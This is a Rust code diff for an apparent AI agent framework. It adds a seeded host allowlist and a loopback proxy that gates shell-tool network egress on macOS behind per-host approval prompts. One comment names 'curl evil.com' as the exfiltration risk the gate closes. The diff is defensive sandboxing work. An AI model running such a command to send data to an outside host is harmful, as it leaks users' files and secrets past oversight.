@@ -39,7 +39,8 @@ use oneai_rag::EmbeddingConfigExt;
 use oneai_skill::SkillSelector;
 use oneai_tool::{
     ChannelInteractionGate, InMemoryHostAllowlist, InteractionGateConfig, NetworkPolicy,
-    NetworkProxy, NoopInteractionGate, ThresholdInteractionGate, ToolExecutor, ToolRegistry,
+    NetworkProxy, NoopInteractionGate, SeededHostAllowlist, ThresholdInteractionGate, ToolExecutor,
+    ToolRegistry,
 };
 use oneai_trace::{InMemoryCollector, TraceContext, TraceEmitter};
 use oneai_workflow::WorkflowExecutor;
@@ -1764,6 +1765,14 @@ impl AppBuilder {
         // `InteractionRequest::NetworkApproval`. When disabled (or unreachable
         // — bwrap netns can't reach host loopback, degrading to no-network),
         // the sandbox air-gaps to `Denied`. See plan hazy-imagining-liskov.md.
+        //
+        // #28 Stage 3 — the allowlist is now `SeededHostAllowlist` over an
+        // `InMemoryHostAllowlist`: the seed pre-approves the common package
+        // registries (npm/pypi/crates.io/…) so `npm install`/`pip install`/
+        // `cargo build` work without a prompt; everything else still prompts.
+        // The same seeded allowlist is shared with the ShellTool egress gate
+        // below (host-level trust, not per-tool) — a host the user admits for
+        // one sandboxed tool is admitted for all.
         {
             let working_dir = self
                 .code_working_dir
@@ -1771,12 +1780,24 @@ impl AppBuilder {
                 .or_else(|| std::env::current_dir().ok())
                 .unwrap_or_else(|| std::path::PathBuf::from("."));
 
+            let allowlist = if self.network_proxy_enabled {
+                let inner = std::sync::Arc::new(InMemoryHostAllowlist::new()) as std::sync::Arc<_>;
+                std::sync::Arc::new(SeededHostAllowlist::new(inner))
+                    as std::sync::Arc<dyn oneai_tool::HostAllowlistStore>
+            } else {
+                // Proxy disabled — no gate to consult; the Arc is unused. Keep
+                // a cheap placeholder so the borrow checker is happy below.
+                std::sync::Arc::new(InMemoryHostAllowlist::new())
+                    as std::sync::Arc<dyn oneai_tool::HostAllowlistStore>
+            };
+
             let proxy_port = if self.network_proxy_enabled {
-                let allowlist =
-                    std::sync::Arc::new(InMemoryHostAllowlist::new()) as std::sync::Arc<_>;
-                let bind =
-                    NetworkProxy::bind(interaction_gate.clone(), allowlist, "code_interpreter")
-                        .await;
+                let bind = NetworkProxy::bind(
+                    interaction_gate.clone(),
+                    allowlist.clone(),
+                    "code_interpreter",
+                )
+                .await;
                 match bind {
                     Ok((proxy, port)) => {
                         tokio::spawn(proxy.run());
@@ -1806,7 +1827,7 @@ impl AppBuilder {
                 permission_resolver.clone(),
                 tool_executor.config().clone(),
                 sandbox,
-                working_dir,
+                working_dir.clone(),
             );
             let code_tool = match proxy_port {
                 Some(port) => code_tool.with_network_proxy(port),
@@ -1817,6 +1838,57 @@ impl AppBuilder {
                 None => code_tool,
             };
             self.tool_registry.register(Arc::new(code_tool)).await?;
+
+            // #28 Stage 3 — ShellTool egress gate. The CodingPack's ShellTool
+            // runs with blanket `NetworkPolicy::Allowed` (so npm/pip/cargo
+            // work) — which means `curl evil.com` exfiltrates with no approval
+            // prompt. On macOS, where the seatbelt sandbox can restrict egress
+            // to loopback only (`LoopbackProxy`), override that ShellTool with
+            // a `LoopbackProxy`-sandboxed + proxy-wired one: direct egress is
+            // blocked, so the command must go through the shared proxy (and
+            // its per-host approval gate + seed allowlist). The seed keeps
+            // `npm install`/`pip install`/`cargo build` prompt-free; any other
+            // host prompts via `InteractionRequest::NetworkApproval`.
+            //
+            // Linux bwrap netns can't reach the host's loopback proxy, so the
+            // gate is impossible there today — leave the CodingPack's `Allowed`
+            // Shell (no regression: npm/pip/cargo still work, egress is just
+            // ungated) and log it. A userspace net stack (slirp/pasta) would
+            // close this — deferred to the Linux strong-gateway follow-up.
+            if self.network_proxy_enabled && cfg!(target_os = "macos") {
+                let shell_bind =
+                    NetworkProxy::bind(interaction_gate.clone(), allowlist.clone(), "shell").await;
+                match shell_bind {
+                    Ok((proxy, shell_port)) => {
+                        tokio::spawn(proxy.run());
+                        tracing::info!(
+                            "shell: egress proxy bound on 127.0.0.1:{shell_port} (LoopbackProxy sandbox)"
+                        );
+                        let shell_sandbox = oneai_tool::default_sandbox_backend_with_policy(
+                            &working_dir,
+                            NetworkPolicy::LoopbackProxy,
+                        );
+                        let shell_tool = oneai_tool::ShellTool::with_sandbox_backend(shell_sandbox)
+                            .with_network_proxy(shell_port);
+                        self.tool_registry
+                            .override_tool(Arc::new(shell_tool))
+                            .await?;
+                    }
+                    Err(e) => {
+                        // Proxy bind failed — do NOT override (a LoopbackProxy
+                        // sandbox without a reachable proxy would block all
+                        // shell network, breaking npm/pip/cargo). Keep the
+                        // CodingPack's `Allowed` shell; egress stays ungated.
+                        tracing::warn!(
+                            "shell: egress proxy bind failed ({e}); shell egress stays ungated (CodingPack Allowed)"
+                        );
+                    }
+                }
+            } else if self.network_proxy_enabled {
+                tracing::info!(
+                    "shell: egress gate unavailable on this platform (loopback proxy unreachable in bwrap netns); shell egress stays ungated. slirp/pasta (Linux strong-gateway) is a deferred follow-up."
+                );
+            }
         }
 
         // Connect MCP plugin servers and register discovered tools
